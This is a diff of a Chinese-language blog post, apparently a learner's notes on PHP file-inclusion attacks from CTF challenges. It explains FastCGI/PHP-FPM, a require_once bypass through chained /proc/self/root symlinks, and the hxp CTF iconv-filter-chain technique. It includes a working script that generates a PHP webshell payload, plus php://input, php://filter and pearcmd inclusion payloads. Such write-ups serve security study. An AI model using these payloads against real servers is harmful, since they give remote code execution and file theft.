@@ -100,12 +100,12 @@ Yume Shoka = Hexo</title>
       </div>
       <div id="imgs" class="pjax">
         <ul>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeyhsblkj20zk0m81kx.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevarprfj20zk0m8npd.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicitht3xtj20zk0m8k5v.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giclx29mstj20zk0m8hdt.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljgocqbj20zk0m8e81.jpg"></li>
-          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipev1x5e4j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1giph4fomxoj20zk0m8axp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipevo9j1jj20zk0m8e81.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gicljitigmj20zk0m87fp.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipesx5fdwj20zk0m81kx.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipeu1usa7j20zk0m8b29.jpg"></li>
+          <li class="item" data-background-image="https://tva2.sinaimg.cn/large/6833939bly1gipet8c1a2j20zk0m8kct.jpg"></li>
         </ul>
       </div>
     </header>
@@ -226,11 +226,30 @@ require(),require_once()<br>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if(stristr($file,&quot;php://filter&quot;) || stristr($file,&quot;zip://&quot;) || stristr($file,&quot;phar://&quot;) || stristr($file,&quot;data:&quot;))&#123;</span><br><span class="line">	exit(&#x27;hacker!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">if($file)&#123;</span><br><span class="line">	if ($file!=&quot;http://www.baidu.com&quot;) echo &quot;tips：flag在当前目录的某个文件中&quot;;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	echo &#x27;&lt;a href=&quot;?file=http://www.baidu.com&quot;&gt;click go baidu&lt;/a&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//file=php://input  &lt;post&gt; &lt;?php system(&#x27;dir&#x27;); ?&gt;</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">show_source(__FILE__);</span><br><span class="line">include(&#x27;flag.php&#x27;);</span><br><span class="line">$a= $_GET[&quot;a&quot;];</span><br><span class="line">if(isset($a)&amp;&amp;(file_get_contents($a,&#x27;r&#x27;)) === &#x27;I want flag&#x27;)&#123;</span><br><span class="line">	echo &quot;success\n&quot;;</span><br><span class="line">	echo $flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//a=php://input    &lt;post&gt; I want flag</span><br><span class="line">//file_get_contents可以读取input流</span><br></pre></td></tr></table></figure>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta charset=&quot;utf8&quot;&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">if (!$file) echo &#x27;&lt;a href=&quot;?file=upload&quot;&gt;upload?&lt;/a&gt;&#x27;;</span><br><span class="line">if(stristr($file,&quot;input&quot;)||stristr($file, &quot;filter&quot;)||stristr($file,&quot;data&quot;)/*||stristr($file,&quot;phar&quot;)*/)&#123;</span><br><span class="line">	echo &quot;hack?&quot;;</span><br><span class="line">	exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	include($file);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!-- flag在当前目录的某个文件中 --&gt;</span><br><span class="line"></span><br><span class="line">//?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
-<h2 id="cgi-fast-cgi"><a class="markdownIt-Anchor" href="#cgi-fast-cgi">#</a> CGI、FAST CGI</h2>
-<p>1、CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>
-<p>2、FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。</p>
-<p>3、PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>
-<p>4、PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。</p>
+<h2 id="cgi-fast-cgiphp-fpm"><a class="markdownIt-Anchor" href="#cgi-fast-cgiphp-fpm">#</a> CGI、FAST CGI，PHP FPM</h2>
+<p>CGI: 指的是 Web 服务器与 web 应用程序之间的一种数据交换协议。</p>
+<p>FastCGI: 类似于 CGI，Fast-CGI 也是一种通信协议，但是它在 CGI 的基础上，在效率上做了一些优化。只有非静态文件才会被 fastcgi 处理</p>
+<p>PHP-CGI: PHP-CGI 是 PHP 对 Web 服务器提供的 CGI 协议的接口程序，即实现了 CGI 协议的 php 解释器程序。它能解析 PHP，也能通过 CGI 与 web 服务器通信。</p>
+<p>PHP-FPM: 是 PHP 对 Web 服务器提供的 FastCGI 协议的接口程序，即在实现解释 PHP 脚本和与 web 服务器通讯的基础上，额外还提供了相对进程调度、任务管理功能。fastcgi process manager</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105160625653.png" alt="image-20221105160625653"></p>
+<p>Apache/nginx 加载 php：</p>
+<p>1. 通过 so 模块加载</p>
+<p>2. 通过 fpm</p>
+<p>3. 通过 cgi</p>
+<p>最佳方式是 apache/Nginx + fastcgi + php fpm</p>
+<img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105161200210.png" alt="image-20221105161200210" style="zoom:67%;" />
+<p>因此 PHP-fpm 是一个 fastcgi 进程管理器，是对于 fastcgi 协议的具体体现</p>
+<p>web 中间件和 phpfpm 的通信方式有两种</p>
+<p>1.socket</p>
+<p>2.TCP 模式</p>
+<p>fastcgi 协议由多个 recode 组成，recode 由 header 和 body 组成，中间件将这两种封装好发送给后端</p>
+<p>可见，一个 FastCGI record 结构最大支持的 body 大小是 2^16，也就是 65536 字节</p>
+<p>recode 中有 type 字段，type 有七种，第 4 种 type 是给 fmp 传递环境参数时表名数据为 key-value 对</p>
+<p>type=4 时，nginx 会将请求分为 key-value 形式，fpm 收到中间件发来的 key-value，最终执行 key 为 script_name，该 value 为你请求的路径</p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164011830.png" alt="image-20221105164011830"></p>
+<p><img data-src="https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221105164219506.png" alt="image-20221105164219506"></p>
+<p>服务器中间件和后端语言（PHP-FPM）通信，第一个数据包就是 type 为 1 的 record，后续互相交流，发送 type 为 4、5、6、7 的 record，结束时发送 type 为 2、3 的 record</p>
+<p>当后端语言（PHP-FPM）拿到由 Nginx 发过来的 FastCGl 数据包后，进行解析，得到上述这些环境变量。然后执行 SCRIPT_FILENAME 的值指向的 PHP 文件，也就是 /var/www/html/index.php</p>
 <p>php-Cgi:</p>
 <p>1) Cgi 协议的实现，用来解释 php 请求；过程: php 请求 -&gt;php-Cgi 读取并解析 php.ini 文件，初始化环境 -&gt; 根据请求参数，返回处理结果</p>
 <p>2）单个进程只能处理一个请求，每一个进程，都需读取 php.ini 进行解析，效率较低</p>
@@ -450,8 +469,55 @@ require(),require_once()<br>
 <p>因此我们最终构造的 payload 如下 <code>GET /index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php HTTP/1.1</code></p>
 <p>简单解释一下，这里的 config-create 会被当做命令行参数执行，执行的第一个参数是要写的文件内容，第二个参数是稳健位置，然后在通过包含即可</p>
 <p>这个好就好在，docker 下的 php 默认都是开这个选项的，而且不用时间竞争，而且路径文件名可控，即使不是 docker 下，仍可以尝试，万一人家要安装依赖没关呢</p>
+<h2 id="通过多级软链接绕过require_once"><a class="markdownIt-Anchor" href="#通过多级软链接绕过require_once">#</a> 通过多级软链接绕过 require_once</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php require_once &#x27;/www/config.php&#x27;; // some logic here... </span><br><span class="line">	  require_once $_GET[&#x27;file&#x27;]; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+<p>如果我们想要读取 /www/config.php 中的文件，通常可以通过 php://filter 来读取，比如 <code>1.1.1.1/a.php?file=php://filter/read=convert.base64-encode/resource=/www/config.php</code> ，但但如果这个文件在前面已经被包含过了，则第二次包含就会失败，即使使用 php://filter 也一样。</p>
+<p>正常情况下，PHP 会将用户输入的文件名进行 resolve，转换成标准的绝对路径，这个转换的过程会将…/、./、软连接等都进行计算，得到一个最终的路径，再进行包含。每次包含都会经历这个过程，所以，只要是相同的文件，不管中间使用了…/ 进行跳转，还是使用软连接进行跳转，都逃不过最终被转换成原始路径的过程，也就绕不过 require_once。</p>
+<p>但是，如果软连接跳转的次数超过了某一个上限，Linux 的 lstat 函数就会出错，导致 PHP 计算出的绝对路径就会包含一部分软连接的路径，也就和原始路径不相同的，即可绕过 require_once 限制。</p>
+<p><code>/proc/self</code>  指向当前进程的 <code>/proc/pid/</code> ， <code>/proc/self/root/</code>  是指向 <code>/</code>  的符号链接，在 Linux 下，最常见的软连接就是 /proc/self/root，这个路径指向根目录。所以，我们可以多次使用这个路径：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require_once &#x27;/www/config.php&#x27;;</span><br><span class="line">include_once &#x27;/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/www/config.php&#x27;;</span><br></pre></td></tr></table></figure>
 <h2 id="hxp-ctf"><a class="markdownIt-Anchor" href="#hxp-ctf">#</a> hxp ctf</h2>
-<p>挖坑～</p>
+<h3 id="the-end-of-lfi"><a class="markdownIt-Anchor" href="#the-end-of-lfi">#</a> the end of LFI</h3>
+<p>在 PHP 中，我们可以利用 PHP Base64 Filter 宽松的解析，通过 iconv filter 等编码组合构造出特定的 PHP 代码进而完成无需<strong>临时文件</strong>的 RCE 。</p>
+<p>前置知识 0x00</p>
+<p>php://filter ，当使用 base64-decode 时，字符 &lt;、?、;、&gt;、空格等一共有 7 个字符不符合 base64 编码的字符范围将被忽略，而合法字符将被正常解码，我们的正常字符包括 <code>A-Za-z0-9\/\=\+</code> 。同时需要注意，base64 在编码的时候是四个字节为一组的，这个在上面 session 包含中有过详细解释</p>
+<p>举个师傅的例子:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$a = &quot;\x1bY\xffQ\xfa&quot;;              //YQ 为 a 的 base64 编码</span><br><span class="line">var_dump(base64_decode($a));</span><br><span class="line"></span><br><span class="line">// string(1) &quot;a&quot;</span><br></pre></td></tr></table></figure>
+<p>很明显，我们的不可见字符，控制字符也被忽略了</p>
+<p><strong>因此我们可以使用 base64 先 decode 在 incode 来去除 base64 不认可的非法字符，这是我们后面做题的基础</strong></p>
+<p>前置知识 0x01 包含文件中的 php 代码</p>
+<p>假如我们有一个文件 e，文件中的内容是：PD9waHAgcGhwaW5mbygpOw==，即 <code>&lt;?php phpinfo();</code>  的 base64 编码，我们有两种方式包含：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">include &quot;php://filter/convert.base64-decode/resource=./e&quot;;</span><br><span class="line">include &quot;php://filter/convert.base64-decode/resource=PD9waHAgcGhwaW5mbygpOw==&quot;;</span><br></pre></td></tr></table></figure>
+<p><code>include</code>  函数实际包含的是 Base64 解码后的 PHP 代码。</p>
+<p>前置知识 0x02 convert.iconv</p>
+<p>PHP Filter 当中有一种  <code>convert.iconv</code>  的 Filter ，可以用来将数据从字符集 A 转换为字符集 B ，其中这两个字符集可以从  <code>iconv -l</code>  获得，这个字符集比较长，不过也存在一些实际上是其他字符集的别名。</p>
+<p>举个例子，我们可以从 utf8 转换为 utf7 的编码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$url = &quot;php://filter/convert.iconv.UTF-8%2fUTF-7/resource=data:,some&lt;&gt;text&quot;;</span><br><span class="line">echo file_get_contents($url);</span><br><span class="line">// Output:</span><br><span class="line">// some+ADwAPg-text</span><br></pre></td></tr></table></figure>
+<p>可以看到，我们在转换的同时成了一些其他的字符，比如 <code>+ADwAPg-</code></p>
+<p>这样结合我们的 base64 的 decode 忽略非法字符，和文件内容包含，也许可以直接转换出我们的 webshell</p>
+<p>比如我们可以通过 UTF8 转 CSISO2022KR 得到字符 C：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line"></span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line"></span><br><span class="line">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;     //我们这里简单使用 `data://` 来模拟文件内容读取。</span><br><span class="line">var_dump(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">// hexdump:</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 1b 24 29 43  |string(18) &quot;.$)C|</span><br><span class="line">// 00000010  61 61 61 61 61 61 61 61  61 61 61 61 61 61 22 0a  |aaaaaaaaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>
+<p>而 c 之前的非法字符，我们只需要利用 decode+incode 去除即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$url = &quot;php://filter/&quot;;</span><br><span class="line">$url .= &quot;convert.iconv.UTF8.CSISO2022KR&quot;;</span><br><span class="line">$url .= &quot;|convert.base64-decode|convert.base64-encode&quot;;</span><br><span class="line">$url .= &quot;/resource=data://,aaaaaaaaaaaaaa&quot;;</span><br><span class="line">var_dump(file_get_contents($url));</span><br><span class="line"></span><br><span class="line">// hexdump</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  32 29 20 22 43 61 61 61  |string(12) &quot;Caaa|</span><br><span class="line">// 00000010  61 61 61 61 61 61 61 61  22 0a                    |aaaaaaaa&quot;.|</span><br></pre></td></tr></table></figure>
+<p>前置知识结束，我们开始构造 payload：</p>
+<p>由于 <code>&lt;</code>  在 base64 是非法字符，我们无法直接构造 <code>&lt;?php</code>  的形式，但我们可以构造 <code>&lt;?php</code> base64 encode 过后的编码，在使用 base64decode 还原即可正常包含</p>
+<p>构造 <code>&lt;</code>  我们可以生成 PAxxxxx 的编码，解码过后我们就可以生成 &lt;，我们接下来要做的就是能找到可以通过编码转换生成我们需要的字符，但后面也可能生成垃圾字符，我们只需要 decode+incode 就可以去除</p>
+<p>我们最后的 webshell 长这样： <code>PD89YCRfR0VUWzBdYDs7Pz4=</code>  是</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[0]\`;;?&gt;</span><br></pre></td></tr></table></figure>
+<p>编码后的结果，两个；；的原因是一个；的 base64  <code>PD89YCRfR0VUWzBdYDs/Pg==</code>  中间有个 /，通过编码转换不好找的这个字符</p>
+<p>其实我发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=`$_GET[0]`; ?&gt;</span><br></pre></td></tr></table></figure>
+<p>你也可以加个空格，这样也不会有 \， <code>PD89YCRfR0VUWzBdYDsgPz4=</code></p>
+<p>最终我们的脚本长这样：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$base64_payload = &quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;;</span><br><span class="line">$conversions = array(</span><br><span class="line">    &#x27;R&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;,</span><br><span class="line">    &#x27;B&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;,</span><br><span class="line">    &#x27;C&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR&#x27;,</span><br><span class="line">    &#x27;8&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;,</span><br><span class="line">    &#x27;9&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;,</span><br><span class="line">    &#x27;f&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;s&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;,</span><br><span class="line">    &#x27;z&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;,</span><br><span class="line">    &#x27;U&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;,</span><br><span class="line">    &#x27;P&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;,</span><br><span class="line">    &#x27;V&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;,</span><br><span class="line">    &#x27;0&#x27; =&gt; &#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;,</span><br><span class="line">    &#x27;Y&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;,</span><br><span class="line">    &#x27;W&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;,</span><br><span class="line">    &#x27;d&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;,</span><br><span class="line">    &#x27;D&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;,</span><br><span class="line">    &#x27;7&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;,</span><br><span class="line">    &#x27;4&#x27; =&gt; &#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$filters = &quot;convert.base64-encode|&quot;;</span><br><span class="line"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br><span class="line">$filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line"></span><br><span class="line">foreach (str_split(strrev($base64_payload)) as $c) &#123;</span><br><span class="line">    $filters .= $conversions[$c] . &quot;|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-decode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.base64-encode|&quot;;</span><br><span class="line">    $filters .= &quot;convert.iconv.UTF8.UTF7|&quot;;</span><br><span class="line">&#125;</span><br><span class="line">$filters .= &quot;convert.base64-decode&quot;;</span><br><span class="line"></span><br><span class="line">$final_payload = &quot;php://filter/&#123;$filters&#125;/resource=data://,aaaaaaaaaaaaaaaaaaaa&quot;;</span><br><span class="line"></span><br><span class="line">// echo $final_payload;</span><br><span class="line">var_dump(file_get_contents($final_payload));</span><br><span class="line"></span><br><span class="line">// hexdump</span><br><span class="line">// 00000000  73 74 72 69 6e 67 28 31  38 29 20 22 3c 3f 3d 60  |string(18) &quot;&lt;?=`|</span><br><span class="line">// 00000010  24 5f 47 45 54 5b 30 5d  60 3b 3b 3f 3e 18 22 0a  |$_GET[0]`;;?&gt;.&quot;.|</span><br></pre></td></tr></table></figure>
+<p><code>convert.iconv.UTF8.UTF7</code>  将等号转换为字母。之所以使用这个的原因是 exp 作者遇到过有时候等号会让  <code>convert.base64-decode</code>  过滤器解析失败的情况，可以使用 iconv 从 UTF8 转换到 UTF7 ，会把字符串中的任何等号变成一些 base64 。</p>
+<p>我们可以知道对于这种方法来说，其实文件内容并不重要，但至少得有内容，而且一般读取有内容的文件并不是大问题，所以我们可以简单尝试利用  <code>/etc/passwd</code> :</p>
+<p>后面还有一些天书一样的解释，我实在…</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM5NS8=">https://tttang.com/archive/1395/</span></p>
+<p>还有一种神仙解法，先挖坑～</p>
+<p><span class="exturl" data-url="aHR0cHM6Ly90dHRhbmcuY29tL2FyY2hpdmUvMTM4NC8=">hxp CTF 2021 - A New Novel LFI - 跳跳糖 (tttang.com)</span></p>
+<p>实话实说，都是我做不出来的解法</p>
+<p>我也就做做 16 年的 ctf 罢了</p>
 
   </div>
 
@@ -463,7 +529,7 @@ require(),require_once()<br>
       <i class="ic i-calendar-check"></i>
     </span>
     <span class="text">Edited on</span>
-    <time title="Modified: 2022-11-02 22:36:20" itemprop="dateModified" datetime="2022-11-02T22:36:20+08:00">2022-11-02</time>
+    <time title="Modified: 2022-11-05 16:44:29" itemprop="dateModified" datetime="2022-11-05T16:44:29+08:00">2022-11-05</time>
   </span>
 </div>
 
@@ -518,7 +584,7 @@ require(),require_once()<br>
     <div class="item left">
       
 
-  <a href="/2022/04/16/Upload/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gicmnywqgpj20zk0m8dwx.jpg" title="File upload">
+  <a href="/2022/04/16/Upload/" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipey84bjtj20zk0m8hdt.jpg" title="File upload">
   <span class="type">Previous Post</span>
   <span class="category"><i class="ic i-flag"></i> web安全</span>
   <h3>File upload</h3>
@@ -528,10 +594,10 @@ require(),require_once()<br>
     <div class="item right">
       
 
-  <a href="/2022/05/27/CSRF/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1gipeyvx1d4j20zk0m8hdt.jpg" title="CSRF">
+  <a href="/2022/05/27/emergency%20response/" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;tva2.sinaimg.cn&#x2F;mw690&#x2F;6833939bly1giclip4jbpj20zk0m87cv.jpg" title="应急响应">
   <span class="type">Next Post</span>
-  <span class="category"><i class="ic i-flag"></i> web安全</span>
-  <h3>CSRF</h3>
+  <span class="category"><i class="ic i-flag"></i> 内网</span>
+  <h3>应急响应</h3>
   </a>
 
     </div>
@@ -550,11 +616,11 @@ require(),require_once()<br>
   <div class="panels">
     <div class="inner">
       <div class="contents panel pjax" data-title="Contents">
-          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#file-include"><span class="toc-number">1.</span> <span class="toc-text"> file include</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.</span> <span class="toc-text"> PHP 伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1file%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.1.0.1.</span> <span class="toc-text"> 1.file 协议</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2phpfilter"><span class="toc-number">1.1.0.2.</span> <span class="toc-text"> 2.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3phpinput"><span class="toc-number">1.1.0.3.</span> <span class="toc-text"> 3.php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4zipbzip2-zlib"><span class="toc-number">1.1.0.4.</span> <span class="toc-text"> 4.zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;, zlib:&#x2F;&#x2F;</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#41-zip"><span class="toc-number">1.1.0.4.1.</span> <span class="toc-text"> 4.1 zip:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#42-bzip2"><span class="toc-number">1.1.0.4.2.</span> <span class="toc-text"> 4.2 bzip2:&#x2F;&#x2F;</span></a></li><li class="toc-item 